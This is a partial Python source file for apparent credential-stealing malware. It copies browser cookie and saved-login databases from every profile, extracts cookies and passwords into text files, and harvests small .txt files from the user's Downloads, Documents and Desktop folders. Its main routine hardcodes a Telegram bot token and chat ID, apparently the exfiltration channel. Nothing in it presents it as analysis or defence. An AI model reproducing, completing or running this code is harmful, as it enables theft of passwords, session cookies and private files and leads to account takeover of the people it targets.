            ...
            for profile in bs['profile']:
                try:
                    if os.path.exists(os.path.join(bs['path'], profile, 'Network', 'Cookies')):
                        shutil.copyfile(os.path.join(bs['path'], profile, 'Network', 'Cookies'), os.path.join(path_data, bs['name']+' '+profile ))
                        cookie.append({'path':os.path.join(path_data, bs['name']+' '+profile ),'pathkey':bs['path'],'name':bs['name'],'profile':profile})
                except:pass
        else:
            pass
    return cookie
            ...
            for profile in bs['profile']:
                try:
                    if os.path.exists(os.path.join(bs['path'], profile, 'Login Data')):
                        shutil.copyfile(os.path.join(bs['path'], profile, 'Login Data'), os.path.join(path_data, bs['name']+' '+profile ))
                        password.append({'path':os.path.join(path_data, bs['name']+' '+profile),'pathkey':bs['path'],'name':bs['name'],'profile':profile})
                except:pass            
        else:
            pass
    return password
def xuli(string:str):
    base = ''
    for j in string.strip().splitlines():
        data = j.split()
        b=0
        for x in data:
            if x == '/':
...
def extract():
    ...
    for row in datacookie:
        try:
            ...
            for user in bc:
                ...
                cookie_data = f"{user[0]}\t{httponly}\t{'/'}\t{secure}\t\t{user[1]}\t{value}\n"
                cookie_data = xuli(cookie_data)
                #print(cookie_data)
                data1.append(cookie_data)
                cookies += 1

                url_filename = f"cookie__{user[0].replace('/', '_')}.txt"
                url_filepath = os.path.join(path_data, row['name'], row['profile'], url_filename)
    ...
    for row in datapassword:
        try:
            ...
            url_filepath = os.path.join(path_data, row['name'], row['profile'], 'passwords.txt')
            os.makedirs(os.path.dirname(url_filepath), exist_ok=True)
...
def grabfile():
    ...
    list_folder = ['Downloads', 'Documents', 'Video', 'Music', 'Desktop']
    files_directory = os.path.join(path_data, 'Files')
        ...
        for root, _, files in os.walk(path):
            for filename in files:
                if filename.endswith('.txt'):
                    ...
                    if size < 500:
                        destination_path = os.path.join(path_data, 'Files', filename)
                        shutil.copy(file_path, destination_path)
                        list_file.append(destination_path)
    return list_file
...
async def main():
    ...
    TOKEN  = '7056661912:AAFMmxSUpaBDLRYQuHNUGzecFo3xlvcDyqY'
    ID = '2082747402'
